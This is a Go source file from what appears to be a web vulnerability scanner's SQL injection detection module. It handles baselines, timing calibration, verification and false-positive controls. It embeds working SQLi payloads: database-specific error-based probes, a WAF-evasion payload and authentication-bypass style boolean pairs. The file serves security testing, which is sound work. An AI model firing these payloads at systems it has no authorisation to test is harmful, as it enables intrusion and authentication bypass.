package modules

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/akha-security/akca/engine/internal/config"
	"github.com/akha-security/akca/engine/internal/evidencemarkers"
	"github.com/akha-security/akca/engine/internal/findingtext"
	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/payloadgen"
	"github.com/akha-security/akca/engine/internal/sensor"
	"github.com/akha-security/akca/engine/internal/timingblind"
	"github.com/akha-security/akca/engine/internal/verification"
)

func (r *Runner) runSQLi(ctx context.Context, target ScanTarget) []ModuleFinding {
	if strings.TrimSpace(target.Parameter) == "" {
		return nil
	}
	if !isLikelySQLiParam(target.Parameter) {
		r.emitSkip("sqli", target, "parameter is not an injection candidate")
		return nil
	}
	var out []ModuleFinding
	r.runSQLiOOB(ctx, target)
	baseline, timingBase, ok, baselineReason := r.stableSQLiBaselineAndTiming(ctx, target)
	if !ok {
		r.runSQLiTimingCoverage(ctx, target, "baseline_unavailable")
		r.runSQLiNonTimingCoverage(ctx, target, "baseline_unavailable")
		r.emitSkip("sqli", target, baselineReason)
		return nil
	}
	sqliPayloads := payloadsForClass(target.Payloads.Payloads, "sqli")
	sqliPayloads = appendSQLiClassicFallbacks(sqliPayloads, r.cfg)
	if len(timingBase.Samples) < 3 {
		timingBase = r.calibrateTargetTimingForModule(ctx, "sqli", target)
	}
	sleepSec := timingblind.RecommendSleepSec(timingBase)
	dbHint := r.techDatabaseHint(target.EndpointURL)
	isNumeric := isNumericTargetValue(target)
	nativeVal := nativeTargetValue(target)
	sqliPayloads = prioritizeSQLiPayloads(sqliPayloads, dbHint, isNumeric, nativeVal)
	classicAttempted := 0
	classicDelivered := 0
	earlySignalFound := false

	fastFailLimit := 6
	if isNumeric {
		fastFailLimit = 10
	}

	for idx, p := range sqliPayloads {
		if p.IsNegativeControl || p.IsControl {
			continue
		}
		// Fast-fail: if initial core error/boolean probes produce zero signal or error, terminate.
		if idx >= fastFailLimit && !earlySignalFound && len(out) == 0 {
			break
		}
		// Content-difference SQLi must be evaluated as a matched true/false
		// predicate pair. A standalone changed page is indistinguishable from
		// cache, personalization, WAF routing and ordinary application behavior.
		if strings.HasPrefix(strings.ToLower(p.ExpectedSignal), "content_change") {
			continue
		}
		if ctx.Err() != nil {
			break
		}
		probePayload := p
		if timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
			probePayload.Value = timingblind.RewriteSleepDuration(p.Value, sleepSec)
		}

		var rr httpclient.RequestResponse
		var probeTarget ScanTarget
		var elapsed int64
		var timingSamples []int64
		var zeroSamples []int64

		if timingblind.IsTimeDelayPayload(probePayload.Value, probePayload.ExpectedSignal) {
			ok, delayMs, samples, zeroS := r.sqliTimingVerified(ctx, target, probePayload.Value, dbHint, timingBase, sleepSec)
			if !ok {
				continue
			}
			elapsed = delayMs
			timingSamples = samples
			zeroSamples = zeroS
			attempt, ok := r.sqliBestAttempt(ctx, target, probePayload.Value, baseline.Response.Body)
			if !ok {
				continue
			}
			rr = attempt.RR
			probeTarget = attempt.Target
		} else {
			classicAttempted++
			start := time.Now()
			attempt, ok := r.sqliBestAttempt(ctx, target, probePayload.Value, baseline.Response.Body)
			if !ok {
				continue
			}
			classicDelivered++
			rr = attempt.RR
			probeTarget = attempt.Target
			elapsed = time.Since(start).Milliseconds()
			if rr.Response.Duration.Milliseconds() > 0 {
				elapsed = rr.Response.Duration.Milliseconds()
			}
		}
		if probeTarget.EndpointURL == "" {
			probeTarget = target
		}

		// Skip CDN/infrastructure error responses — they are not evidence of SQLi.
		// However, 500/501 can carry genuine SQL error messages, so only skip them
		// if the body does NOT contain a real SQL error pattern.
		if isInfrastructureError(rr.Response.StatusCode) {
			continue
		}
		if (rr.Response.StatusCode == 500 || rr.Response.StatusCode == 501) &&
			!sqliErrorInBody(rr.Response.Body, baseline.Response.Body) {
			continue
		}
		if sqliErrorInBody(rr.Response.Body, baseline.Response.Body) ||
			rr.Response.StatusCode == 500 ||
			(baseline.Response.StatusCode < 400 && rr.Response.StatusCode >= 400 && rr.Response.StatusCode != 404) {
			earlySignalFound = true
		}
		signal := detectSQLiSignal(probePayload, rr.Response.Body, baseline.Response.Body, elapsed, timingBase, sleepSec, rr.Response.StatusCode)
		if signal != "" {
			earlySignalFound = true
		}
		runtimeEvent, runtimeAssessment, runtimeObserved := r.runtimeAssessment(ctx, rr)
		if runtimeObserved && runtimeAssessment.Safe {
			// A correlated prepared/bound SQL execution is deterministic safe
			// evidence and overrides response-only SQL error/body heuristics.
			continue
		}
		if runtimeObserved && runtimeAssessment.Vulnerable && runtimeAssessment.Sink != nil &&
			strings.EqualFold(runtimeAssessment.Sink.Type, "sql") {
			f := r.buildSQLiRuntimeFinding(probeTarget, probePayload, baseline, rr, runtimeEvent, runtimeAssessment)
			if f != nil {
				if r.recordFinding(ctx, &out, f, "sqli", f.Evidence.Signal) {
					return out
				}
			}
			continue
		}
		if signal == "" {
			continue
		}
		if !sqliSignalConfirmed(probePayload, rr.Response.Body, baseline.Response.Body, signal) {
			continue
		}
		// Deterministic re-probes to eliminate false positives
		if signal == "error_based" {
			reprobe, err := r.probeForModule(ctx, "sqli", probeTarget, probePayload.Value)
			if err != nil || !sqliErrorInBody(reprobe.Response.Body, baseline.Response.Body) {
				continue
			}
			syntaxControl := sqliSyntaxPreservingControl(probePayload.Value)
			controlRR, controlErr := r.probeForModule(ctx, "sqli", probeTarget, syntaxControl)
			if controlErr != nil || sqliErrorInBody(controlRR.Response.Body, baseline.Response.Body) {
				continue
			}
		}
		if signal == "timing_differential" && timingblind.UseDelayedVerification(r.cfg) {
			r.scheduleDelayedTimingProbe(delayedTimingProbe{
				Target: target, Module: "sqli", Payload: probePayload,
				Baseline: timingBase, SleepSec: sleepSec, FirstMs: elapsed, Scheduled: time.Now(),
			})
			continue
		}
		f := r.buildSQLiFinding(ctx, probeTarget, probePayload, baseline, rr, signal, "", elapsed, timingBase, sleepSec, timingSamples, zeroSamples)
		if f != nil {
			if r.recordFinding(ctx, &out, f, "sqli", signal) {
				return out
			}
		}
	}
	r.emitSQLiCoverage("sqli_error_probe_coverage", target, map[string]interface{}{
		"payloads_attempted": classicAttempted, "payloads_delivered": classicDelivered,
		"verification_skipped": false,
	})

	// Dynamic probes (boolean-blind, union-based, timing, stacked, OOB) execute
	// unconditionally for all parameter targets to guarantee zero missed vulnerabilities.

	for _, dyn := range sqliDynamicTimingPayloads(sleepSec, dbHint) {
		if ctx.Err() != nil {
			break
		}
		ok, elapsed, samples, zeroS := r.sqliTimingVerified(ctx, target, dyn.Value, dbHint, timingBase, sleepSec)
		if !ok {
			continue
		}
		attempt, ok := r.sqliBestAttempt(ctx, target, dyn.Value, baseline.Response.Body)
		if !ok {
			continue
		}
		probeTarget := attempt.Target
		if probeTarget.EndpointURL == "" {
			probeTarget = target
		}
		if timingblind.UseDelayedVerification(r.cfg) {
			r.scheduleDelayedTimingProbe(delayedTimingProbe{
				Target: target, Module: "sqli", Payload: dyn,
				Baseline: timingBase, SleepSec: sleepSec, FirstMs: elapsed, Scheduled: time.Now(),
			})
			continue
		}
		f := r.buildSQLiFinding(ctx, probeTarget, dyn, baseline, attempt.RR, "timing_differential", "", elapsed, timingBase, sleepSec, samples, zeroS)
		if f != nil {
			if r.recordFinding(ctx, &out, f, "sqli", "timing_differential") {
				return out
			}
		}
	}

	if findings := r.booleanBlindSQLiProbe(ctx, target, baseline); len(findings) > 0 {
		out = append(out, findings...)
		return out
	}
	if findings := r.unionSQLiProbe(ctx, target, baseline); len(findings) > 0 {
		out = append(out, findings...)
		return out
	}
	if findings := r.stackedSQLiProbe(ctx, target, baseline, timingBase, sleepSec, dbHint); len(findings) > 0 {
		out = append(out, findings...)
		return out
	}
	return out
}

func (r *Runner) buildSQLiRuntimeFinding(target ScanTarget, p payloadgen.Payload,
	baseline, probe httpclient.RequestResponse, event sensor.Event, assessment sensor.Assessment) *ModuleFinding {
	if assessment.Sink == nil || event.TraceID == "" || event.RequestID == "" {
		return nil
	}
	sinkName := strings.ToLower(strings.TrimSpace(assessment.Sink.Type)) + ":" +
		strings.TrimSpace(assessment.Sink.Operation)
	candidate := verification.Candidate{
		ScanID: r.scanID, Title: "sqli on " + target.Parameter, VulnClass: "sqli",
		EndpointURL: target.EndpointURL, Method: target.Method, Parameter: target.Parameter,
		Payload: p.Value, Module: "sqli", Signal: "runtime_unsafe_sql_sink",
		Baseline: snapshot(baseline.Response), Probe: snapshot(probe.Response),
		Reflection: &target.Profile, DirectTypedSignal: true,
		ProofPolicyVersion: verification.CurrentProofPolicyVersion,
		RequestedProofType: verification.ProofRuntimeTrace,
	}
	candidate.Observations = append(candidate.Observations,
		r.observation("sqli", target, verification.RoleNativeBaseline, 1, baseline),
		r.observation("sqli", target, verification.RolePositiveProbe, 1, probe),
		verification.NewRuntimeObservation(
			r.scanID, "sqli", target.EndpointURL, target.Parameter, target.Location,
			event.RequestID, event.TraceID, sinkName, 1, false,
		),
	)
	result := r.verifier.Verify(candidate)
	if result.Suppressed || !result.ProofSatisfied {
		return nil
	}
	return &ModuleFinding{
		Title: findingtext.HumanTitle("sqli"), VulnClass: "sqli",
		Severity: severityFor("sqli", result.Confidence), Endpoint: target.EndpointURL,
		Parameter: target.Parameter, Location: target.Location, Confidence: result.Confidence,
		Description: findingtext.HumanDescription(
			"sqli", "runtime_unsafe_sql_sink", target.Parameter, target.EndpointURL, p.Value, p.Variant, target.Location,
		),
		Evidence: Evidence{
			Module: "sqli", Signal: "runtime_unsafe_sql_sink", Payload: p,
			Parameter: target.Parameter, Location: target.Location,
			ResponseMarkers: []string{"correlated runtime trace", sinkName},
			Request:         probe.Request, Response: probe.Response, Verification: result,
			DetectedAt: time.Now().UTC(),
		},
	}
}

func sqliAdvancedSurfaceReady(target ScanTarget, payloads []payloadgen.Payload, cfg config.ScanConfig) bool {
	_ = payloads
	_ = cfg
	return strings.TrimSpace(target.Parameter) != ""
}

func sqliSemanticParameterName(name string) bool {
	canonical := strings.NewReplacer("-", "_", ".", "_", "[", "_", "]", "_").Replace(
		strings.ToLower(strings.TrimSpace(name)),
	)
	parts := strings.FieldsFunc(canonical, func(r rune) bool {
		return r == '_' || r == ':' || r == '/'
	})
	for _, part := range parts {
		switch part {
		case "id", "uid", "user", "username", "email", "q", "query", "search",
			"term", "keyword", "filter", "where", "category", "product",
			"account", "order", "item", "sort", "name", "value", "input",
			"data", "code", "ref", "key", "num", "no", "pid", "sid", "cat",
			"type", "status", "page", "group", "field", "col", "column",
			"artist", "genre", "author", "title", "book", "pass", "pwd", "password",
			"txtsearch", "body", "review", "comment", "desc", "description",
			"message", "note", "tag", "lang", "city", "country", "zip", "year",
			"month", "day", "amount", "price", "phone", "mobile", "address",
			"subject", "action", "file", "doc", "view", "tab", "topic", "thread",
			"post", "forum", "member", "role", "session", "token", "auth", "login",
			"submit", "find", "select", "show", "dir", "path", "url", "link",
			"target", "dest", "redir", "redirect", "album", "track", "song",
			"movie", "film", "actor", "director", "rating", "vote", "poll", "opt",
			"option", "param", "val", "arg", "text", "content", "info", "detail",
			"details", "dept", "department", "emp", "employee", "cust", "customer",
			"client", "vendor", "item_id", "prod_id", "cat_id", "user_id", "art_id", "artist_id":
			return true
		}
		for _, suffix := range []string{"id", "query", "filter", "name", "key", "code", "value", "search", "type", "cat", "data", "num", "text", "user", "tag", "val", "param"} {
			if len(part) > len(suffix)+2 && strings.HasSuffix(part, suffix) {
				return true
			}
		}
	}
	return false
}

func (r *Runner) buildSQLiFinding(ctx context.Context, target ScanTarget, p payloadgen.Payload, baseline, probe httpclient.RequestResponse,
	signal, oastURL string, elapsed int64, timingBase timingblind.Baseline, sleepSec int, timingSamples []int64, zeroSamples []int64) *ModuleFinding {
	if !sqliFindingAllowed(p, signal, baseline.Response, probe.Response, oastURL) {
		return nil
	}
	candidate := r.buildCandidate(ctx, "sqli", target, p, baseline, probe, signal)
	if signal == "timing_differential" || signal == "stacked_timing" {
		candidate.TimingBaseline = append([]int64(nil), timingBase.Samples...)
		if len(timingSamples) > 0 {
			candidate.TimingSamples = timingSamples
			candidate.TimingMatchedControl = append([]int64(nil), zeroSamples...)
			candidate.TimingControl = append([]int64(nil), zeroSamples...)
		} else {
			candidate.TimingSamples = []int64{elapsed}
			candidate.TimingControl = append([]int64(nil), timingBase.Samples...)
		}
	}
	result := r.verifier.Verify(candidate)
	if result.Suppressed {
		return nil
	}
	if signal == "error_based" && result.Confidence == verification.Confirmed {
		result.Confidence = verification.HighConfidence
		if result.Score >= 0.9 {
			result.Score = 0.89
		}
	}
	return &ModuleFinding{
		Title:       findingtext.HumanTitle("sqli"),
		VulnClass:   "sqli",
		Severity:    severityFor("sqli", result.Confidence),
		Endpoint:    target.EndpointURL,
		Parameter:   target.Parameter,
		Location:    target.Location,
		Description: findingtext.HumanDescription("sqli", signal, target.Parameter, target.EndpointURL, p.Value, p.Variant, target.Location),
		Confidence:  result.Confidence,
		Evidence: Evidence{
			Module: "sqli", Signal: signal, Payload: p,
			Parameter: target.Parameter, Location: target.Location,
			ResponseMarkers: evidencemarkers.ForResponse(
				p.Value, signal, baseline.Response.Body, probe.Response.Body, "",
			),
			Request: probe.Request, Response: probe.Response, Verification: result, OASTURL: oastURL,
			DetectedAt: time.Now().UTC(),
		},
	}
}

func sqliSyntaxPreservingControl(value string) string {
	if strings.TrimSpace(value) == "'" {
		return "''"
	}
	if strings.TrimSpace(value) == `"` {
		return `""`
	}
	control := strings.NewReplacer(
		"SELECT", "SELXCT", "select", "selxct",
		"UNION", "UNXON", "union", "unxon",
		"ORDER", "ORDEX", "order", "ordex",
		"WHERE", "WHXRE", "where", "whxre",
		" AND ", " XND ", " and ", " xnd ",
		" OR ", " XR ", " or ", " xr ",
		"'", "''",
		`"`, `""`,
	).Replace(value)
	if control == value {
		return value + value
	}
	return control
}

func detectSQLiSignal(p payloadgen.Payload, body, baseline string, elapsedMs int64, timingBase timingblind.Baseline, sleepSec int, probeStatus int) string {
	// CDN/infrastructure errors (e.g. Cloudflare 520-527, 502, 503, 504) are
	// never valid evidence of SQL injection. Their error pages cause body diffs
	// and their timeouts mimic sleep-based injections.
	if isInfrastructureError(probeStatus) {
		return ""
	}
	if sqliErrorInBody(body, baseline) {
		return "error_based"
	}
	if strings.HasPrefix(p.ExpectedSignal, "sql_error") {
		if sqliErrorInBody(body, baseline) {
			return "error_based"
		}
	}
	// A body difference from one predicate is not SQL execution evidence.
	// Boolean SQLi is emitted only by booleanBlindSQLiProbe after matched,
	// alternating true/false probes reproduce on the same request surface.
	if strings.HasPrefix(p.ExpectedSignal, "timing") || timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
		if ok, _ := timingblind.VerifyProbe(elapsedMs, timingBase, sleepSec); ok {
			return "timing_differential"
		}
	}
	return ""
}

func isTimeBasedSQLi(p payloadgen.Payload) bool {
	return timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal)
}

func sqliDynamicTimingPayloads(sleepSec int, dbHint string) []payloadgen.Payload {
	seen := map[string]struct{}{}
	out := make([]payloadgen.Payload, 0, 3)
	add := func(p payloadgen.Payload) {
		key := strings.ToLower(strings.TrimSpace(p.Value))
		if key == "" {
			return
		}
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		out = append(out, p)
	}
	db := strings.ToLower(strings.TrimSpace(dbHint))
	switch {
	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
		add(timingblind.SQLiSleepPayload(sleepSec, "mysql"))
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		add(timingblind.SQLiSleepPayload(sleepSec, "mssql"))
	case strings.Contains(db, "postgres"):
		add(timingblind.SQLiPgSleepPayload(sleepSec))
	case strings.Contains(db, "oracle"):
		add(timingblind.SQLiSleepPayload(sleepSec, "oracle"))
	default:
		// Unknown database: test the top engines
		add(timingblind.SQLiSleepPayload(sleepSec, "mysql"))
		add(timingblind.SQLiPgSleepPayload(sleepSec))
		add(timingblind.SQLiSleepPayload(sleepSec, "mssql"))
	}
	return out
}

func appendSQLiClassicFallbacks(existing []payloadgen.Payload, cfg config.ScanConfig) []payloadgen.Payload {
	hasProbe := false
	for _, p := range existing {
		if p.IsNegativeControl || p.IsControl || strings.HasPrefix(strings.ToLower(p.ExpectedSignal), "content_change") ||
			timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
			continue
		}
		hasProbe = true
		break
	}
	if hasProbe {
		return existing
	}

	limit := len(sqliFallbackPayloadSet)
	if cfg.ScanIntensity == "fast" || cfg.ScanIntensity == "stealth" {
		limit = 1
	}

	return append(existing, sqliFallbackPayloadSet[:limit]...)
}

func prioritizeSQLiPayloads(payloads []payloadgen.Payload, dbHint string, isNumeric bool, nativeVal string) []payloadgen.Payload {
	var numericProbes []payloadgen.Payload
	if isNumeric && nativeVal != "" {
		numericProbes = []payloadgen.Payload{
			defaultPayload("sqli", "numeric_error_convert", nativeVal+" AND 1=CONVERT(INT, @@version)-- -", "sql_error"),
			defaultPayload("sqli", "numeric_error_cast", nativeVal+" AND (SELECT 1 FROM CAST((SELECT version()) AS INT))-- -", "sql_error"),
			defaultPayload("sqli", "numeric_error_extractvalue", nativeVal+" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -", "sql_error"),
			defaultPayload("sqli", "numeric_arithmetic_subzero", nativeVal+"-0", "sql_error"),
		}
	}
	combined := append(numericProbes, payloads...)
	if dbHint != "" {
		hint := strings.ToLower(strings.TrimSpace(dbHint))
		var hinted []payloadgen.Payload
		var rest []payloadgen.Payload
		for _, p := range combined {
			pv := strings.ToLower(p.Variant + " " + p.Value)
			if strings.Contains(pv, hint) {
				hinted = append(hinted, p)
			} else {
				rest = append(rest, p)
			}
		}
		combined = append(hinted, rest...)
	}
	return combined
}

var sqliFallbackPayloadSet = []payloadgen.Payload{
	// Basic error triggers
	defaultPayload("sqli", "dynamic_single_quote", `'`, "sql_error"),
	defaultPayload("sqli", "dynamic_double_quote", `"`, "sql_error"),
	defaultPayload("sqli", "dynamic_parenthesized_quote", `')`, "sql_error"),
	// MySQL Error-based
	defaultPayload("sqli", "mysql_extractvalue", `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -`, "sql_error"),
	defaultPayload("sqli", "mysql_updatexml", `' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)-- -`, "sql_error"),
	// PostgreSQL Error-based
	defaultPayload("sqli", "pg_cast_error", `' AND (SELECT 1 FROM CAST((SELECT version()) AS INT))-- -`, "sql_error"),
	// MSSQL Error-based
	defaultPayload("sqli", "mssql_convert_error", `' AND 1=CONVERT(INT, @@version)-- -`, "sql_error"),
	// Oracle Error-based
	defaultPayload("sqli", "oracle_ctxsys_error", `' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1))-- -`, "sql_error"),
	// WAF Tampered
	defaultPayload("sqli", "waf_inline_comment", `'/*foo*/OR/*bar*/'1'='1`, "sql_error"),
}

func (r *Runner) emitSQLiCoverage(eventType string, target ScanTarget, fields map[string]interface{}) {
	if r.emit == nil {
		return
	}
	fields["scan_id"] = r.scanID
	fields["endpoint"] = target.EndpointURL
	fields["parameter"] = target.Parameter
	fields["location"] = target.Location
	_ = r.emit(eventType, "SQLi probe coverage recorded", fields)
}

// When a page is too unstable for differential verification, still exercise
// the non-timing SQLi paths. Findings remain suppressed because there is no
// trustworthy baseline, but the scan no longer silently skips these payloads.
func (r *Runner) runSQLiNonTimingCoverage(ctx context.Context, target ScanTarget, reason string) {
	type coverageProbe struct {
		family  string
		payload string
	}
	probes := []coverageProbe{
		{"error", `'`},
		{"boolean", `' AND '1'='1-- -`},
		{"boolean", `' AND '1'='2-- -`},
		{"union", `' UNION SELECT NULL-- -`},
	}
	attempted := map[string]int{}
	delivered := map[string]int{}
	for _, probe := range probes {
		if ctx.Err() != nil {
			break
		}
		attempted[probe.family]++
		if len(r.injectionProbeAttemptsForModule(ctx, "sqli", target, probe.payload)) > 0 {
			delivered[probe.family]++
		}
	}
	r.emitSQLiCoverage("sqli_non_timing_probe_coverage", target, map[string]interface{}{
		"error_attempted": attempted["error"], "error_delivered": delivered["error"],
		"boolean_attempted": attempted["boolean"], "boolean_delivered": delivered["boolean"],
		"union_attempted": attempted["union"], "union_delivered": delivered["union"],
		"verification_skipped": true, "reason": reason,
	})
}

func (r *Runner) runSQLiTimingCoverage(ctx context.Context, target ScanTarget, reason string) {
	sleepSec := timingblind.RecommendSleepSec(timingblind.Baseline{})
	dbHint := r.techDatabaseHint(target.EndpointURL)
	attempted := 0
	delivered := 0
	for _, p := range sqliDynamicTimingPayloads(sleepSec, dbHint) {
		if ctx.Err() != nil || attempted >= 3 {
			break
		}
		attempted++
		attempts := r.injectionProbeAttemptsForModule(ctx, "sqli", target, p.Value)
		if len(attempts) > 0 {
			delivered++
		}
	}
	if r.emit != nil {
		_ = r.emit("sqli_timing_probe_coverage", "SQLi timing probe coverage recorded", map[string]interface{}{
			"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
			"payloads_attempted": attempted, "payloads_delivered": delivered,
			"verification_skipped": true, "reason": reason, "db_hint": dbHint,
		})
	}
}

// runBooleanSQLi is retained for direct compatibility tests. The main SQLi
// flow uses booleanBlindSQLiProbe because it requires replayed true/false
// branches, a second operand set and a syntax-preserving control.
func (r *Runner) runBooleanSQLi(ctx context.Context, target ScanTarget, baseline httpclient.RequestResponse) []ModuleFinding {
	if strings.TrimSpace(target.Parameter) == "" {
		return nil
	}

	nativeVal := nativeTargetValue(target)
	if nativeVal == "" {
		nativeVal = "1"
	}

	pairs := []struct {
		trueVal  string
		falseVal string
		variant  string
	}{
		// SmartScanner & Standard DAST winning boolean pairs
		{nativeVal + "' or '1'='1", nativeVal + "' and '1'='0", "auth_quoted_or"},
		{nativeVal + "' or 1=1-- a", nativeVal + "' and 1=0-- a", "auth_comment_or"},
		{nativeVal + " or 1>0", nativeVal + " and 1>1", "numeric_or_gt"},
		{nativeVal + " and 1>0", nativeVal + " and 1>1", "numeric_and_gt"},
		{nativeVal + "' AND '1'='1", nativeVal + "' AND '1'='2", "quoted_boolean_and"},
		{nativeVal + "' AND 1=1-- -", nativeVal + "' AND 1=2-- -", "comment_boolean_dash"},
		{nativeVal + "' AND 1=1#", nativeVal + "' AND 1=2#", "comment_boolean_hash"},
		{nativeVal + "' AND 1=1/*", nativeVal + "' AND 1=2/*", "comment_boolean_slash"},
		{nativeVal + `" AND "1"="1"`, nativeVal + `" AND "1"="2"`, "double_quoted_boolean_and"},
		{nativeVal + `" AND 1=1-- -`, nativeVal + `" AND 1=2-- -`, "double_quoted_boolean_dash"},
		{nativeVal + `" AND 1=1#`, nativeVal + `" AND 1=2#`, "double_quoted_boolean_hash"},
		{nativeVal + " AND 1=1", nativeVal + " AND 1=2", "numeric_boolean_and"},
		{nativeVal + " AND 1=1-- -", nativeVal + " AND 1=2-- -", "numeric_boolean_dash"},
		{nativeVal + "') AND ('1'='1", nativeVal + "') AND ('1'='2", "parenthesized_boolean"},
		{"' OR '1'='1", "' OR '1'='2", "quoted_boolean_or"},
		{" OR 1=1", " OR 1=2", "numeric_boolean_or"},
	}

	var out []ModuleFinding
	pairsAttempted := 0
	requestsDelivered := 0
	defer func() {
		r.emitSQLiCoverage("sqli_boolean_probe_coverage", target, map[string]interface{}{
			"pairs_attempted": pairsAttempted, "requests_delivered": requestsDelivered,
			"verification_skipped": false,
		})
	}()
	for _, p := range pairs {
		if ctx.Err() != nil {
			break
		}

		pairsAttempted++
		// 1. Probe TRUE condition
		rrTrue, errTrue := r.probeForModule(ctx, "sqli", target, p.trueVal)
		if errTrue != nil {
			continue
		}
		requestsDelivered++

		// 2. Probe FALSE condition
		rrFalse, errFalse := r.probeForModule(ctx, "sqli", target, p.falseVal)
		if errFalse != nil {
			continue
		}
		requestsDelivered++

		trueLen := len(rrTrue.Response.Body)
		falseLen := len(rrFalse.Response.Body)
		baseLen := len(baseline.Response.Body)

		lenDiff := falseLen - trueLen
		if lenDiff < 0 {
			lenDiff = -lenDiff
		}

		baseDiff := trueLen - baseLen
		if baseDiff < 0 {
			baseDiff = -baseDiff
		}

		if (baseDiff < (baseLen/5+50) || rrTrue.Response.StatusCode == baseline.Response.StatusCode) &&
			(rrFalse.Response.StatusCode != rrTrue.Response.StatusCode || lenDiff > (trueLen/10+20)) {
			signal := "boolean_differential"
			payloadObj := defaultPayload("sqli", p.variant, p.trueVal, signal)
			f := r.verifyAndBuild(ctx, "sqli", target, payloadObj, baseline, rrTrue, signal, false, false, "", "")
			if f != nil {
				f.Title = "Boolean-Based Blind SQL Injection"
				f.Severity = "critical"
				f.Description = fmt.Sprintf("The parameter '%s' evaluated true predicate '%s' identically to baseline (HTTP %d, %d bytes) while false predicate '%s' altered response state (HTTP %d, %d bytes).", target.Parameter, p.trueVal, rrTrue.Response.StatusCode, trueLen, p.falseVal, rrFalse.Response.StatusCode, falseLen)
				r.recordFinding(ctx, &out, f, "sqli", signal)
				break
			}
		}
	}
	return out
}
